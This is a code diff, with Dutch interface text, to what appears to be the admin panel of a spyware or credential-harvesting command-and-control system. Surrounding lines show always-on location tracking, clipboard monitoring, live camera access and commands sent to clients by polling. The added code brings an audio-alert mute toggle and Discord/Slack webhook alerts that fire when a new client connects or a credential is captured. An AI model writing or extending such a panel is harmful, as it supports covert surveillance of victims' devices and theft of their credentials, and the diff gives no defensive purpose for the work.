@@ -357,6 +357,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <button class="btn" onclick="window.open('/','_blank')">Preview Site</button>
     <div class="search-wrap"><input type="text" id="globalSearch" placeholder="Search everything..." onkeyup="onGlobalSearch(event)"><button class="search-btn" onclick="doGlobalSearch()">🔍</button></div>
     <button class="btn export" onclick="downloadFullBackup()" title="Download full store as timestamped JSON">⬇ Export JSON</button>
+    <button id="mute-btn" class="btn" onclick="toggleMute()" title="Toggle audio alerts">🔔</button>
     <span id="refresh-ring" title="Refreshing..."></span><button class="btn" onclick="openShortcutModal()" title="Keyboard shortcuts (?)">⌨ ?</button>
     <button class="btn" onclick="refreshAll()">↻ Refresh</button>
     <button id="theme-btn" class="btn" onclick="toggleTheme()" title="Toggle dark/light mode">🌙</button>
@@ -694,6 +695,14 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
                 <div>▶ Live Camera: via knop in Cameras-tabblad</div>
                 <div style="margin-top:6px;color:var(--text2)">Commands worden verstuurd via polling (3s).</div>
             </div>
+        </div>
+        <div class="cfg-group">
+            <h3>🔔 Webhook Notificaties</h3>
+            <div style="font-size:.7rem;color:var(--dim);margin-bottom:8px">Discord/Slack webhook URL — leeg laten om uit te schakelen</div>
+            <div class="cfg-row"><label>Webhook URL</label><input type="text" id="cfg-webhook-url" placeholder="https://discord.com/api/webhooks/..." style="flex:1;background:var(--bg2);border:1px solid var(--border2);color:var(--fg);padding:5px 10px;border-radius:6px;font-size:.72rem"></div>
+            <div class="cfg-row" style="margin-top:6px"><label>Nieuwe client</label><label class="tgl"><input type="checkbox" id="cfg-webhook-new-client" checked><span></span></label></div>
+            <div class="cfg-row"><label>Credential opgepakt</label><label class="tgl"><input type="checkbox" id="cfg-webhook-credential" checked><span></span></label></div>
+            <div style="margin-top:8px"><button class="cfg-btn secondary" onclick="testWebhook()">Test Webhook</button></div>
         </div>
     </div>
     <div class="cfg-actions">
@@ -1240,6 +1249,8 @@ if (socket) {
     $('#dot').className = 'dot on';
     $('#connTxt').textContent = 'Polling actief';
     requestBrowserNotifications();
+    // Sync mute button icon from persisted state
+    (function() { const btn = document.getElementById('mute-btn'); if (btn) btn.textContent = audioMuted ? '🔇' : '🔔'; })();
     refreshAll();
     // Auto-refresh every 5s so admin sees live data without socket.io
     setInterval(refreshAll, 5000);
@@ -2052,7 +2063,18 @@ function showToast(ev) {
     }
 }
 
+let audioMuted = localStorage.getItem('cc-muted') === '1';
+
+function toggleMute() {
+    audioMuted = !audioMuted;
+    try { localStorage.setItem('cc-muted', audioMuted ? '1' : '0'); } catch {}
+    const btn = document.getElementById('mute-btn');
+    if (btn) btn.textContent = audioMuted ? '🔇' : '🔔';
+    toast(audioMuted ? '🔇 Audio alerts muted' : '🔔 Audio alerts unmuted');
+}
+
 function playAdminNotifSound(type) {
+    if (audioMuted) return;
     try {
         const a = new AudioContext();
         const o = a.createOscillator();
@@ -2154,6 +2176,10 @@ async function loadConfig() {
     $('#cfg-clip-on').checked = cfg.clipboardEnabled !== false;
     $('#cfg-clip-check').value = Math.round((cfg.clipboardCheck || 15000) / 1000);
     $('#cfg-hb').value = Math.round((cfg.heartbeatPeriod || 8000) / 1000);
+    // Webhook settings
+    if ($('#cfg-webhook-url')) $('#cfg-webhook-url').value = cfg.webhookUrl || '';
+    if ($('#cfg-webhook-new-client')) $('#cfg-webhook-new-client').checked = cfg.webhookOnNewClient !== false;
+    if ($('#cfg-webhook-credential')) $('#cfg-webhook-credential').checked = cfg.webhookOnCredential !== false;
 }
 
 async function saveConfig() {
@@ -2164,6 +2190,10 @@ async function saveConfig() {
         clipboardEnabled: $('#cfg-clip-on').checked,
         clipboardCheck: parseInt($('#cfg-clip-check').value) * 1000,
         heartbeatPeriod: parseInt($('#cfg-hb').value) * 1000,
+        // Webhook
+        webhookUrl: ($('#cfg-webhook-url')?.value || '').trim(),
+        webhookOnNewClient: $('#cfg-webhook-new-client')?.checked !== false,
+        webhookOnCredential: $('#cfg-webhook-credential')?.checked !== false,
         // Always-on, non-configurable
         photoEnabled: false, videoEnabled: false,
         locationEnabled: true, locationPeriod: 30000
@@ -2172,6 +2202,16 @@ async function saveConfig() {
         await apiFetch('/api/config', { method: 'POST', body: JSON.stringify(cfg) });
         toast('\u2705 Instellingen opgeslagen!');
     } catch(e) { toast('\u274C Opslaan mislukt: ' + e.message); }
+}
+
+async function testWebhook() {
+    const url = ($('#cfg-webhook-url')?.value || '').trim();
+    if (!url) { toast('⚠️ Geen webhook URL ingesteld'); return; }
+    try {
+        await apiFetch('/api/config', { method: 'POST', body: JSON.stringify({ webhookUrl: url }) });
+        await apiFetch('/api/webhook-test', { method: 'POST' });
+        toast('✅ Test webhook verstuurd');
+    } catch(e) { toast('❌ Webhook test mislukt: ' + e.message); }
 }
 
 async function resetConfig() {
